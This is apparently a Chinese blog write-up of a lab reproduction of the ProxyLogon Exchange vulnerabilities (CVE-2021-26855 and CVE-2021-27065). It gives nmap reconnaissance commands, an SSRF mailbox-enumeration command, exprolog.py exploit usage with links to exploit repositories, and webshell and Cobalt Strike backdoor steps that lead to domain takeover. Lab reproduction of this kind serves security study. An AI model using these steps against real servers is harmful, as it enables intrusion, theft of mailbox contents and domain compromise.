> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.csdn.net](https://blog.csdn.net/qq_44159028/article/details/123825115)

**目录**

[漏洞概述](#t0)

[环境搭建](#t1)

[漏洞复现](#t2)

漏洞概述
----

[CVE](https://so.csdn.net/so/search?q=CVE&spm=1001.2101.3001.7020)-2021-26855 与 CVE-2021-27065 是微软在 2021 年 3 月 2 日发布的高危漏洞公告。这套组合拳被称为 ProxyLogon，可直接获取目标邮件服务器主机权限。

CVE-2021-26855 SSRF 漏洞 ，该漏洞是 Exchange 中的服务端请求伪造漏洞（SSRF），利用此漏洞的攻击者能够发送任意 HTTP 请求并绕过 Exchange Server 身份验证，远程未授权的攻击者可以利用该漏洞以进行内网探测，并可以用于窃取用户邮箱的全部内容。

CVE-2021-27065 任意文件写入漏洞，该漏洞是 Exchange 中的任意文件写入漏洞。该漏洞需要进行身份认证，利用此漏洞可以将文件写入服务器上的任何路径。并可以结合利用 CVE-2021-26855 SSRF 漏洞或绕过权限认证进行文件写入。

利用原理：通过 ssrf 漏洞读取到邮箱用户的 SID——> 通过有效 SID 结合任意文件写入漏洞上传以. aspx 结尾的文件，在其中插入一句话木马——> 造成交互式 shell。

环境搭建
----

exchange 环境搭建：[Win2012 R2 安装 Exchange Server2016](https://blog.csdn.net/qq_44159028/article/details/123814873?spm=1001.2014.3001.5501 "Win2012 R2 安装Exchange Server2016")

建议将 exchange 安装在域控上。我一开始是将 exchange 安装在独立的服务器上，然后执行 exp 的时候一直显示 "[!] Failed to get OAB ID"，后面装在域控上才成功复现

![](https://img-blog.csdnimg.cn/0ef612b2f85a4a8e94438963750b814e.png)

搭建好的环境如下

![](https://img-blog.csdnimg.cn/c30cf8ad69a94deb9c3c678315fdfc25.png)

[漏洞复现](https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&spm=1001.2101.3001.7020)
----------------------------------------------------------------------------------------------------

要利用此漏洞我们需要知道一个邮箱号，而邮箱号一般由账号名 @域名组成

1. 利用 nmap 探测域名

有三个可以利用的脚本

```
1. 
nmap -T3 -sV -n -sT -Pn -v -p 80,443 --script http-ntlm-info.nse --script-args http-ntlm-info.root=/ews/ ip
2.
nmap -T3 -sV -n -sT -Pn -v -p 80,443 --script http-ntlm-info.nse --script-args http-ntlm-info.root=/oab/ ip
3. 
nmap -T3 -sV -n -sT -Pn -v -p 80,443 --script http-ntlm-info.nse --script-args http-ntlm-info.root=/autodiscover/ ip
```

这里使用第一个脚本，我们获取了这个域的域名为 test.lab

![](https://img-blog.csdnimg.cn/6edd0994939c4c70aabe927c37a2611a.png)

2. 利用 CVE-2021-26855 SSRF 获取邮箱内容

地址：[CVE-2021-26855](https://codeload.github.com/charlottelatest/CVE-2021-26855/zip/refs/heads/main "CVE-2021-26855")

相当于枚举邮箱名字，因为我们已经获取了域名。user.txt 里面为我们加入的邮箱名字典

```
go run CVE-2021-26855.go -h 192.168.110.152 -U user.txt

```

枚举出了三个邮箱

![](https://img-blog.csdnimg.cn/051b575564d64471b3e4b1c5b8854820.png)

3. 命令执行

exp 地址：[https://github.com/herwonowr/exprolog](https://github.com/herwonowr/exprolog "https://github.com/herwonowr/exprolog")

```
exprolog.py -t 192.168.89.115 -e administrator@test.lab

```

如下给出了命令执行的方式

![](https://img-blog.csdnimg.cn/963962a4ccca4777ad4e3ac06f743815.png)

 将其放到 burp 中

![](https://img-blog.csdnimg.cn/ce9592c34a5d43efb382ea35a43dc6ac.png)

4. 上线 cs

生成 HTA 文档后门，上线 cs。由于 Exchange 在域中具有高权限，因此，很容易就能拿到域控权限